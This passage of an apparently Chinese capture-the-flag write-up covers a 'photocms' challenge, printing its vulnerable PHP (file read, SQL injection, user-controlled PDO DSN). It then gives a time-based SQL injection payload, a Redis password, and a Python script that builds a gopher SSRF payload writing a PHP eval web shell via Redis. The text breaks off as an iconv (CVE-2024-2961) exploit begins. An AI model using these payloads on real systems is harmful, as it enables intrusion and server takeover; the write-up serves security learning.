/flag<br></code></pre></td></tr></table></figure><h1 id="photocms"><a href="#photocms" class="headerlink" title="photocms"></a>photocms</h1><p>hint说开了redis。</p><p>photo.php可以读文件，也存在sql注入:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">clearall</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filepath</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$back</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;back = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">bak</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;back-&gt;<span class="hljs-title function_ invoke__">backup</span>(<span class="hljs-variable">$this</span>-&gt;filepath))&#123;<br>                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filepath);<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error!&#x27;</span>);<br>        &#125;<br>    &#125;<br>  <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bak</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backup</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;/var/www/back/&quot;</span>.<span class="hljs-variable">$name</span>);<br>  &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;download_url&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;download_url&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;gopher&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;phar&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>),<span class="hljs-string">&#x27;flag&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>  &#125;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Transfer-Encoding: binary&#x27;</span> ); <br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Expires: 0&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Cache-Control: must-revalidate&#x27;</span>);<br>  <span class="hljs-title function_ invoke__">ob_clean</span>(); <br>  <span class="hljs-title function_ invoke__">flush</span>(); <br>  <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&quot;/var/www/html/images/&quot;</span>.<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$file</span>));<br>  <span class="hljs-keyword">exit</span>; <br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$photo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=photo&#x27;</span>, <span class="hljs-string">&#x27;photo&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO filelist (filedata) VALUES (&#x27;<span class="hljs-subst">$photo</span>&#x27;)&quot;</span>;<br>        <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/images/1.jpg&quot;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$photo</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;upload OK&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pdoceshi&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$dbms</span>=<span class="hljs-string">&quot;mysql&quot;</span>;<br>  <span class="hljs-variable">$host</span>=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br>  <span class="hljs-variable">$dbName</span>=<span class="hljs-string">&#x27;photo&#x27;</span>;<br>  <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;photo&#x27;</span>;<br>  <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;root&#x27;</span>;<br>  <span class="hljs-variable">$connectpdo</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pdo&#x27;</span>];<br>  <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-variable">$conne</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$connectpdo</span>, <span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>);<br>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$conne</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PDO OK!&quot;</span>;<br>      &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>      <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Error!: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>() . <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>文件上传和unlink，很容易想到打phar，但是测试后好像phar给ban了。</p><p>index.php有file_get_contents：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;<br>&lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;meta name=<span class="hljs-string">&quot;keywords&quot;</span> content=<span class="hljs-string">&quot;Transact Solutions a Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, </span><br><span class="hljs-string">Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design&quot;</span> /&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/bootstrap.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/font-awesome.min.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;<br>&lt;link href=<span class="hljs-string">&quot;css/style.css&quot;</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> type=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>/&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br> &lt;section <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">contact</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">contact</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">container</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">h3</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">xyz</span>&quot;&gt;<span class="hljs-title">base64</span>图片生成系统&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">row</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>-<span class="hljs-title">lg</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">md</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">sm</span>-6 <span class="hljs-title">dghgffg</span>&quot;&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus9</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">base64</span>图片预览&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">data</span>:<span class="hljs-title">image</span>/<span class="hljs-title">png</span>;<span class="hljs-title">base64</span>,&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">file_get_contents</span>(&#x27;/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">images</span>/1.<span class="hljs-title">jpg</span>&#x27;));?&gt;&quot;/&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus2</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h3</span>&gt;<span class="hljs-title">Download</span>&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">i</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">fa</span> <span class="hljs-title">fa</span>-<span class="hljs-title">flag</span>&quot; <span class="hljs-title">aria</span>-<span class="hljs-title">hidden</span>=&quot;<span class="hljs-title">true</span>&quot;&gt;&lt;/<span class="hljs-title">i</span>&gt; &lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;./<span class="hljs-title">photo</span>.<span class="hljs-title">php</span>?<span class="hljs-title">download_url</span>=<span class="hljs-title">MS5qcGc</span>=&quot;&gt;点击下载&lt;/<span class="hljs-title">a</span>&gt;&lt;<span class="hljs-title">br</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">col</span>-<span class="hljs-title">lg</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">md</span>-6 <span class="hljs-title">col</span>-<span class="hljs-title">sm</span>-6 <span class="hljs-title">sdtrthjh</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">form</span> <span class="hljs-title">action</span>=&quot;./<span class="hljs-title">photo</span>.<span class="hljs-title">php</span>&quot; <span class="hljs-title">method</span>=&quot;<span class="hljs-title">post</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">contactus10</span>&quot;&gt;</span><br><span class="hljs-class">  &lt;<span class="hljs-title">h3</span>&gt;图片编码&lt;/<span class="hljs-title">h3</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">                        &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">group</span>&quot;&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">name</span>&quot;&gt;</span><br><span class="hljs-class">                                <span class="hljs-title">base64</span>图片&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                            &lt;<span class="hljs-title">textarea</span> <span class="hljs-title">name</span>=&quot;<span class="hljs-title">photo</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">message</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">form</span>-<span class="hljs-title">control</span>&quot; <span class="hljs-title">rows</span>=&quot;9&quot; <span class="hljs-title">cols</span>=&quot;25&quot; <span class="hljs-title">required</span>=&quot;<span class="hljs-title">required</span>&quot;</span><br><span class="hljs-class">                               &gt;&lt;/<span class="hljs-title">textarea</span>&gt;</span><br><span class="hljs-class">                        &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">                        &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">btn</span> <span class="hljs-title">btn</span>-<span class="hljs-title">primary</span> <span class="hljs-title">pull</span>-<span class="hljs-title">right</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">btnContactUs</span>&quot;&gt;</span><br><span class="hljs-class">                          点击提交&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">                           &lt;/<span class="hljs-title">form</span>&gt; </span><br><span class="hljs-class">  &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  </span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">  &lt;/<span class="hljs-title">section</span>&gt;</span><br><span class="hljs-class"> &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">map</span>&quot;&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"> &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>.<span class="hljs-title">easing</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">move</span>-<span class="hljs-title">top</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">bootstrap</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">grayscale</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">js</span>/<span class="hljs-title">SmoothScroll</span>.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>&quot;&gt;&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-class">&lt;!-- <span class="hljs-title">projects</span> --&gt;</span><br><span class="hljs-class">$(<span class="hljs-title">document</span>).<span class="hljs-title">ready</span>(<span class="hljs-title">function</span>()</span>&#123;<br>  $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>    $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">slideToggle</span>(<span class="hljs-string">&quot;fast&quot;</span>);<br>    $(this).<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-string">&quot;[class^=&#x27;large-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">slideToggle</span>();<br>  &#125;);<br>  <br>  $(<span class="hljs-string">&quot;.close&quot;</span>).<span class="hljs-title function_ invoke__">click</span>(function()&#123;<br>    $(<span class="hljs-string">&quot;[class^=&#x27;large-&#x27;]:visible&quot;</span>).<span class="hljs-title function_ invoke__">toggle</span>();<br>    $(<span class="hljs-string">&quot;[class^=&#x27;thumbnail-&#x27;]&quot;</span>).<span class="hljs-title function_ invoke__">fadeToggle</span>(<span class="hljs-string">&quot;fast&quot;</span>);; <br>  &#125;); <br>  <br>&#125;);<br><br><span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOW</span>().<span class="hljs-title function_ invoke__">init</span>();<br>&lt;/script&gt;<br>&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>$(document).<span class="hljs-title function_ invoke__">ready</span>(function() &#123;<br><span class="hljs-keyword">var</span> defaults = &#123;<br>containerID: <span class="hljs-string">&#x27;toTop&#x27;</span>, <span class="hljs-comment">// fading element id</span><br>containerHoverID: <span class="hljs-string">&#x27;toTopHover&#x27;</span>, <span class="hljs-comment">// fading element hover id</span><br>scrollSpeed: <span class="hljs-number">1200</span>,<br>easingType: <span class="hljs-string">&#x27;linear&#x27;</span> <br>&#125;;<br>$().<span class="hljs-title function_ invoke__">UItoTop</span>(&#123; <span class="hljs-attr">easingType</span>: <span class="hljs-string">&#x27;easeOutQuart&#x27;</span> &#125;);<br>&#125;);<br>&lt;/script&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可以打sql注入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">photo<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and (select sleep(3)));#</span><br></code></pre></td></tr></table></figure><p>redis :6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs redis">requirepass 79a1c5a9ad7370f0ff80ea96a10a481a<br></code></pre></td></tr></table></figure><p>SSRF：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span>  <span class="hljs-comment"># 使用的协议</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span>   <span class="hljs-comment"># 目标redis的端口号</span><br>shell=<span class="hljs-string">&quot;\n\n&lt;?php phpinfo();\n@eval($_POST[1]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;shell.php&quot;</span>   <span class="hljs-comment"># shell的名字</span><br>path=<span class="hljs-string">&quot;/var&quot;</span>      <span class="hljs-comment"># 写入的路径</span><br>passwd=<span class="hljs-string">&quot;79a1c5a9ad7370f0ff80ea96a10a481a&quot;</span>   <span class="hljs-comment"># 如果有密码 则填入</span><br><span class="hljs-comment"># 我们的恶意命令</span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):<br>    CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.quote(redis_format(x))<br>    <span class="hljs-built_in">print</span> payload<br>    <span class="hljs-built_in">print</span> urllib.quote(<span class="hljs-string">&quot;二次url编码后的结果:\n&quot;</span> + payload)<br></code></pre></td></tr></table></figure><p>通过dsn可以触发wrapper 从而来触发iconv的cve，又是CVE-2024-2961……</p><p>把&#x2F;proc&#x2F;self&#x2F;maps和libc下载下来，然后改改iconv的exp，手动打exploit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 